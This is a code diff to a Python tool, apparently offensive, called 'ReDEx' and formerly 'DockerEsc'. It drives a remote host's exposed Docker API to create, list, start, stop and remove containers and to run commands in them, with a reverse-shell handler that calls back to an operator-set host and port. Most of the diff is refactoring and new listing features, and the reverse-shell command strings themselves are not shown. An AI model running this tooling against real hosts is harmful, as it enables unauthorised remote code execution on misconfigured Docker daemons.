@@ -34,7 +34,8 @@ INFO = """
 
 BUGS = [
     "    > [red]Using the Reverse Shell you would have to press ENTER sometimes to go on[/red]\n"
-    "    > [red]Some commands don't show their outputs unless ENTER is pressed[/red]"
+    "    > [red]Some commands don't show their outputs unless ENTER is pressed[/red]\n"
+    "    > [red]Custom commands execution does not show the result and gives errors[/red]"
 ]
 
 c = Console(color_system="truecolor")
@@ -125,12 +126,12 @@ class ReverShellHandler:
         self.__lport = lport
 
     def handle_rv(self, exec_start: Dict[str, bool], addr: str, exec_id: str) -> None:
-        response = requests.post(f"http://{addr}/exec/{exec_id}/start", json=exec_start)
-        conn, addr = self.__socket.accept()
-        c.print(f"[*] Connection {addr} => {self.__lhost}:{self.__lport}")
+        try:
+            response = requests.post(f"http://{addr}/exec/{exec_id}/start", json=exec_start)
+            conn, addr = self.__socket.accept()
+            c.print(f"[*] Connection {addr} => {self.__lhost}:{self.__lport}")
 
-        while True:
-            try:
+            while True:
                 while 1:
                     try:
                         ans = conn.recvmsg(1024)[0].decode()
@@ -149,9 +150,8 @@ class ReverShellHandler:
                 command += "\n"
                 conn.send(command.encode())
                 time.sleep(0.10)
-            except KeyboardInterrupt:
-                print()
-                break
+        except KeyboardInterrupt:
+            ...
 
         c.print(f"[*] Connection Closing ... ", style="yellow")
         self.__socket.close()
@@ -215,20 +215,38 @@ class Commands:
                              desc="Stop a container",
                              cmd="stop",
                              info="Stop the container identified with name NAME"),
-        "exec"     : Command(name="exec",
+        "execute"  : Command(name="execute",
                              desc="Execute a command inside a running container (default=rvshell)",
-                             cmd="exec [command=COMMAND]",
-                             info="COMMAND can be one between [" + ", ".join(CMD_TYPES) + "] or your own")
+                             cmd="execute [command=COMMAND]",
+                             info="COMMAND can be one between [" + ", ".join(CMD_TYPES) + "] or your own"),
+        "lstconts" : Command(name="lstconts",
+                             desc="List all containers of a remote host",
+                             cmd="lstconts [all] [imgs=[IMG1,...]] [nets=[NET1, ...]] [status=STATUS]",
+                             info="If no parameter is passed than it will show only running containers\n" + 
+                             " " * 15 + "- imgs filters containers by given images\n" + 
+                             " " * 15 + "- nets fitlers containers by given networks\n" + 
+                             " " * 15 + "- status filters containers by a given status. Possible status are\n" + 
+                             " " * 15 + "      + created\n" + 
+                             " " * 15 + "      + restarting\n" + 
+                             " " * 15 + "      + running\n" + 
+                             " " * 15 + "      + removing\n" + 
+                             " " * 15 + "      + paused\n" + 
+                             " " * 15 + "      + exited\n" +
+                             " " * 15 + "      + dead\n"),
+        "remove"   : Command(name="remove",
+                             desc="Remove one or more containers",
+                             cmd="remove [names=[NAME1, ...]]",
+                             info="If no name given, remove the one named with NAME")
     }
 
     @classmethod
     def print(cls, *args) -> None:
         cmds = {cmd : cls.CMDS[cmd] for cmd in args if cmd in cls.CMDS} if args else cls.CMDS
         for _, v in cmds.items():
-            c.print(v, style="bold")
+            c.print(v)
 
 
-class DockerEsc:
+class RemoteDockerExecution:
     def __init__(self, ) -> None:
         c.print(APP_NAME, style="bold yellow", justify="center")
         c.print("[u]Welcome to Remote Docker Execution - ReDEx v1.0.0[/u]\n", 
@@ -261,13 +279,17 @@ class DockerEsc:
                     }]
                 },
                 "NetworkDisabled" : self.__networkdisab,
-                "Entrypoint": ["tail", "-f", "/dev/null"]
+                "Entrypoint": ["tail", "-f", "/dev/null"],
             },
             "exec" : {
                 "Cmd" : [
                     "/bin/bash", "-c", 
                     "{:s}"
-                ]
+                ],
+                "AttachStdin" : True,
+                "AttachStdout" : True,
+                "AttachStderr" : True,
+                "Tty" : True
             },
             "exec_start" : {
                 "Tty" : True
@@ -280,16 +302,75 @@ class DockerEsc:
         }
 
     @staticmethod
-    def print_dict(d: Dict[str, Any], lvl: int=1) -> None:
-        for k, v in d.items():
-            spaces = "  " * lvl
-            if isinstance(v, dict):
-                c.print(f"{spaces}'{k}' = " + "{", style="bold")
-                DockerEsc.print_dict(v, lvl + 1)
-                c.print(f"{spaces}" + "}", style="bold")
+    def merge_args(args: List[str]) -> List[str]:
+        outputs = []
+        old = ""
+
+        for el in args:
+            if "=" in el:
+                if old != "":
+                    outputs.append(old.strip())
+
+                old = el
                 continue
             
-            c.print(f"{spaces}'{k}' = {v}", style="bold")
+            old += " " + el
+
+        outputs.append(old.strip())
+        return outputs
+
+    @staticmethod
+    def extrapolate_informations_from_json(data: Dict[str, Any]) -> Dict[str, Any]:
+        # Takes general informations
+        container_id = data["Id"]
+        container_name = data["Names"][0]
+        base_image = data["Image"]
+        command = data["Command"]
+        state = data["State"]
+
+        # Takes exposed ports
+        _available_ports = data["Ports"]
+        ports = {"Ports": []}
+        for port in _available_ports:
+            port_str = f"{port['PrivatePort']} -> {port['PublicPort']}(type={port['Type']})"
+            ports["Ports"].append(port_str)
+
+        # Takes labels
+        _available_labels = data["Labels"]
+        labels = {"Labels": []}
+        for k, v in _available_labels.items():
+            label_str = f"{k.split('.')[-1]}={v}"
+            labels["Labels"].append(label_str)
+
+        # Takes network settings
+        _available_networks = data["NetworkSettings"]["Networks"]
+        networks = dict()
+        for net_k, net_v in _available_networks.items():
+            networks[net_k] = {}
+            networks[net_k]["NetworkID"] = net_v["NetworkID"]
+            networks[net_k]["EndpointID"] = net_v["EndpointID"]
+            networks[net_k]["Gateway"] = net_v["Gateway"]
+            networks[net_k]["IPAddress"] = net_v["IPAddress"]
+            networks[net_k]["MacAddress"] = net_v["MacAddress"]
+
+        # Takes mount points
+        _available_mount_points = data["Mounts"]
+        mounts = {"Mounts": []}
+        for mount in _available_mount_points:
+            mount_str = f"{mount['Source']} -> {mount['Destination']}(type={mount['Type']})"
+            mounts["Mounts"].append(mount_str)
+
+        return {
+            "Id"       : container_id,
+            "Name"     : container_name,
+            "Image"    : base_image,
+            "Command"  : command,
+            "State"    : state,
+            "Ports"    : ports["Ports"],
+            "Labels"   : labels["Labels"],
+            "Networks" : networks,
+            "Mounts"   : mounts["Mounts"]
+        }
 
     def setvalue(self, *args) -> None:
         name_class = self.__class__.__name__
@@ -312,13 +393,12 @@ class DockerEsc:
             k = k.split("_")[-1].upper()
 
             if isinstance(v, dict):
-                c.print("%s = {" % k, style="bold")
-                DockerEsc.print_dict(v)
-                c.print("}", style="bold")
+                c.print("%s =" % k)
+                c.print(v)
                 
                 continue
 
-            c.print(f"{k} = {v} (type={type(v)})", style="bold")
+            c.print(f"{k} = {v} (type={type(v)})")
 
     def quit(self, *args) -> None:
         c.print("\n[*] Quitting ... ", style="bold red")
@@ -410,49 +490,53 @@ class DockerEsc:
         )
 
         if response.status_code != 201:
+            c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
             raise Exception
 
-        c.print(f"[*] [bold green]Container Created[/bold green] ID: {response.json()['Id']}")
+        c.print(f"[*] [green]Container Created[/green] ID: {response.json()['Id']}")
 
     def start(self, *args) -> None:
         addr  = f"{self.__rhost}:{self.__rport}"
         response = requests.post(f"http://{addr}/containers/{self.__name}/start")
         if response.status_code != 204:
+            c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
             raise Exception
         
-        c.print(f"[*] [bold green]Container {self.__name.upper()} Has stated[/bold green]")
+        c.print(f"[*] [green]Container {self.__name.upper()} Has stated[/green]")
 
     def stop(self, *args) -> None:
         addr  = f"{self.__rhost}:{self.__rport}"
         response = requests.post(f"http://{addr}/containers/{self.__name}/stop")
         if response.status_code != 204:
+            c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
             raise Exception
         
-        c.print(f"[*] [bold green]Container {self.__name.upper()} Has been stopped[/bold green]")
+        c.print(f"[*] [green]Container {self.__name.upper()} Has been stopped[/green]")
 
     def cexec(self, *args) -> None:
         addr    = f"{self.__rhost}:{self.__rport}"
         command = self.__command
-        args    = []
+        arg    = []
         
         if command == "rvshell":
-            args = [self.__lhost, self.__lport]
+            arg = [self.__lhost, self.__lport]
         
         if command in self.command_types:
-            cmd = self.command_types[command].format(*args)
+            cmd = self.command_types[command].format(*arg)
         else:
             cmd = command
 
         data = self.__data["exec"]
-        data["Cmd"][2] =  f'{data["Cmd"][2].format(cmd)}'
+        data["Cmd"][2] =  f'{cmd}'
 
         c.print(f"[*] Executing command: [yellow]'{cmd}'[/yellow]")
         
         response = requests.post(f"http://{addr}/containers/{self.__name}/exec", json=data)
         exec_id = response.json()["Id"]
-        c.print(f"[*] [bold green]Exec instance created with ID[/bold green]: \n{exec_id}")
+        c.print(f"[*] [green]Exec instance created with ID[/green]: \n{exec_id}")
 
         if response.status_code != 201:
+            c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
             raise Exception
 
         if command == "rvshell":
@@ -464,8 +548,74 @@ class DockerEsc:
                 print(e)
 
         response = requests.post(f"http://{addr}/exec/{exec_id}/start", json=self.__data["exec_start"])
-        print(response.status_code, response.text)
+        if response.status_code != 200:
+            c.print(f"[*] [red]Error: {response.text}[/red]")
+            raise Exception
+
+        c.print("[*] [green]Result[/green]")
+        c.print(response.text)
+
         return None
+
+    def list_containers(self, *args) -> None:
+        show_all = False
+        filters  = dict()
+        args     = list(args)
+
+        if "all" in args:
+            show_all = True
+            args.remove("all")
+
+        maps = {"imgs" : "ancestor", "nets" : "network", "status": "status"}
+
+        for arg in args:
+            name, filts = arg.split("=")
+            if name not in maps:
+                c.print(f"[red]No argument with name: {name}")
+                raise KeyError
+
+            real_name = maps[name]
+            filters[real_name] = filts.split(",")
+
+        addr = f"{self.__rhost}:{self.__rport}"
+        params = {
+            "all" : show_all,
+            "filters" : json.dumps(filters)
+        }
+        response = requests.get(f"http://{addr}/containers/json", params=params)
+        if response.status_code != 200:
+            c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
+            raise Exception
+
+        containers = response.json()
+        if not containers:
+            c.print(f"[*] [yellow]Empty Result[/yellow]")
+            return
+        
+        contents = {}
+        try:
+            for container in containers:
+                infos = RemoteDockerExecution.extrapolate_informations_from_json(container)
+                contents[infos["Name"]] = infos
+            
+            c.print(contents)
+        except KeyError as ke:
+            print(ke)
+
+    def remove(self, *args) -> None:
+        if len(args) > 0:
+            names = list(args)[0].split("=")[-1].split(",")
+        else:
+            names = [self.__name]
+        
+        addr = f"{self.__rhost}:{self.__rport}"
+        for name in names:
+            response = requests.delete(f"http://{addr}/containers/{name}")
+            if response.status_code != 204:
+                c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
+                raise Exception
+            
+            c.print(f"[*] [green]Removed container {name}[/green]")
 
     def run(self) -> None:
         maps = {
@@ -481,7 +631,9 @@ class DockerEsc:
             "create"   : self.create,
             "start"    : self.start,
             "stop"     : self.stop,
-            "exec"     : self.cexec
+            "execute"  : self.cexec,
+            "lstconts" : self.list_containers,
+            "remove"   : self.remove
         }
 
         while True:
@@ -497,7 +649,7 @@ class DockerEsc:
                 # Take the name of the command
                 splitte_cmd = cmd.split()
                 if len(splitte_cmd) > 1:
-                    name, args = splitte_cmd[0], splitte_cmd[1:]
+                    name, args = splitte_cmd[0], RemoteDockerExecution.merge_args(splitte_cmd[1:])
                     maps[name](*args)
                     continue
                 
@@ -513,5 +665,5 @@ class DockerEsc:
 
 
 if __name__ == "__main__":
-    de = DockerEsc()
-    de.run()
+    rde = RemoteDockerExecution()
+    rde.run()
